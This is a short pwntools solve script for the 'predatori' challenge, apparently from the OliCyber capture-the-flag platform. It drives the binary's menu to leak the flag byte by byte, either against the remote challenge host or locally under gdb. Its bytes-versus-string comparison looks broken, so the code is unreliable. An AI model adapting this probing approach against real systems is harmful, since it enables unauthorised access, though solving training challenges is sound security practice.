#!/usr/bin/env python3
from pwn import *

elf = ELF('./predatori')
if args.REMOTE:
    r = remote('predatori.challs.olicyber.it', 15006)
else:
    r = gdb.debug('./predatori', '''
    break *rww+94
    continue
    ''')

d = False
flag = 'flag{'
for i in range(255):
    r.recvuntil(b'Esci\n')
    r.sendline(b'1')
    r.recvline()
    r.send(bytes([i]))
    r.recvline()
    data = r.recv(8)
    if d and data[:-1] != '\n':
        flag += chr(i)
    elif d and data[:-1] == '\n':
        print(flag)
        break
    elif b'flag{' in data:
        d = True

r.close()